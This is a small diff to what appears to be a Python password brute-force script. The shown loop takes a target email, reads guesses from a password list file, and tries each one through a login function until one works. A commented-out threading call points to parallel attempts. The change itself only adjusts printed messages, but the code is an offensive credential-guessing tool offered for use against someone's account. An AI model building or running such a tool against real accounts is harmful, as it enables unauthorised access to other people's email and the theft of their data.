@@ -60,10 +60,12 @@ print('_________________________________________________________________________
 file=open('passwords.txt','r')
 i=0
 email=input('Enter Email : ')
+print("")
+print("Target Email ID : ",email)
 while file:
 	passw=file.readline().strip()
 	i+=1
-	print("Trying : ",i,passw)
+	print("Trying Password: ",i,passw)
 	if function(email,passw,i):
 		break
 	# threading.Thread(target=function,args=(email,passw,i)).start()
